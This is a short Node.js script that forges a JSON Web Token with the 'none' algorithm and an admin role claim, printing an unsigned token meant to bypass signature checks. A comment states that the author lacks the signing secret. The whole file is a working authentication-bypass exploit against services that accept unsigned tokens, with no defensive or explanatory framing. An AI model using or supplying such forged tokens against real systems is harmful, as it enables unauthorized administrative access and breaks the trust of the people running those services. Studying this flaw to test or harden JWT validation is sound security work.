const crypto = require('crypto');

const secret = ""; // we don't have the secret!

const b64url = (obj) =>
    Buffer.from(JSON.stringify(obj))
        .toString('base64')
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

const payload = { sub: 'admin', role: 'admin' };
const header = { alg: 'none', typ: 'JWT' };

const signingInput = b64url(header) + '.' + b64url(payload);
console.log(signingInput + '.');
